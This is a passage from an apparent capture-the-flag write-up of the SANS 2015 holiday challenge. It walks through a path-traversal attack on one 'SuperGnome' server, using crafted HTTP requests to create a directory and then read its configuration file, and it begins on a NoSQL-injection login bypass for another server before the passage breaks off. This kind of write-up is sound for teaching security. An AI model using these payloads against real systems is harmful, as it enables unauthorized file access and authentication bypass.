&lt;span class="hll"&gt;  &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;access&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./public/images/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;F_OK&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;R_OK&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;end&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;File ./public/images/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; does not exist or access denied!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;});&lt;/span&gt;
  &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;readFile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./public/images/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;camera&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;end&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the &lt;code&gt;camera&lt;/code&gt; parameter goes through no sanitization. The
only thing done to this parameter is that it is appended with the
&lt;code&gt;'.png'&lt;/code&gt; string. However, on some version of the gnome, this string is
appended only if it is not previously found in the parameter. This means that
if we find a directory with &lt;code&gt;.png&lt;/code&gt; in its name, we can access any file.&lt;/p&gt;
&lt;p&gt;Fortunately, we can create a directory with an arbitray name:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;// File www/route/index.js, line 127&lt;/span&gt;
&lt;span class="c1"&gt;// SETTINGS UPLOAD&lt;/span&gt;
&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/settings&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;logged_in&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;user_level&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;99&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// AUGGIE: settings upload allowed for admins (admins are 100, currently)&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;filen&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;filen&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;dirname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/gnome/www/public/upload/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;newdir&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;filen&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;free&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;disk&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;check&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;info&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;free&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;info&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;free&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;      &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;mknewdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;lastIndexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
&lt;/span&gt;      &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Dir &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;dirname&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;lastIndexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/ created successfully!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;code&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;EEXIST&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;free&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;99999999999&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// AUGGIE: I think this is breaking uploads?  Stuart why did you set this so high?&lt;/span&gt;
      &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Insufficient space!  File creation error!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt;
    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;index&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;GIYH::ADMIN PORT V.01&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;session&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This time, the parameter without any sanitization is &lt;code&gt;filen&lt;/code&gt;, which is
the name of our new settings file. Since it's not sanitized, we can put
special characters, like &lt;code&gt;/&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/settings&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;52.34.3.80&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Referer&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;http://52.34.3.80/settings&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;sessionid=jle7GDOGWl2hB4Upp5ry&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;26&lt;/span&gt;

filen=foo.png/foo&amp;amp;file=bar
&lt;/pre&gt;&lt;/div&gt;
&lt;img alt="sg02_folder_creation_success.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg02_folder_creation_success.png" /&gt;
&lt;p&gt;Then we can use the path traversal vulnerability to recover the configuration
file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/cam?camera=../upload/YoGjNkHo/foo.png/../../../../../../gnome/www/files/gnome.conf&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;52.34.3.80&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.5.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/\*;q=0.8&lt;/span&gt;
&lt;span class="na"&gt;Accept-Language&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip, deflate&lt;/span&gt;
&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;sessionid=jle7GDOGWl2hB4Upp5ry&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;X-Powered-By&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;GIYH::SuperGnome by AtnasCorp&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Sun, 20 Dec 2015 18:58:59 GMT&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;339&lt;/span&gt;

Gnome Serial Number: XKCD988
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-02
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The flag for this SuperGnome is &lt;code&gt;XKCD988&lt;/code&gt;
(&lt;a class="reference external" href="https://xkcd.com/988/"&gt;geeky reference&lt;/a&gt;).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id3"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://52.64.191.71/"&gt;SuperGnome03&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We can't even connect to this SuperGnome with our stolen credentials!&lt;/p&gt;
&lt;img alt="sg03_failed_login.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg03_failed_login.png" /&gt;
&lt;p&gt;That means that we have to bypass authentication somehow. The usual way is
using an SQL injection. But since the DBMS is MongoDB, we can't use traditional
SQL injection: we have to use NoSQL injection.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;// File www/routes/index.js, line 105&lt;/span&gt;
&lt;span class="c1"&gt;// LOGIN POST&lt;/span&gt;
&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;db&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
&lt;span class="hll"&gt;  &lt;span class="nx"&gt;db&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;users&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;findOne&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// STUART: Removed this in favor of below.  Really guys?&lt;/span&gt;
&lt;/span&gt;  &lt;span class="c1"&gt;//db.get(&amp;#39;users&amp;#39;).findOne({username: (req.body.username || &amp;quot;&amp;quot;).toString(10), password: (req.body.password || &amp;quot;&amp;quot;).toString(10)}, function (err, user) { // LOUISE: allow passwords longer than 10 chars&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Invalid username and password: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Invalid username or password!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;msgs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;msgs&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;index&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;GIYH::ADMIN PORT V.01&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;session&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;sessionid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;gen_session&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
      &lt;span class="nx"&gt;sessions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sessionid&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;logged_in&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;user_level&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;user_level&lt;/span&gt; &lt;span class="p"&gt;};&lt;/span&gt;
      &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;User level:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;user&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;user_level&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
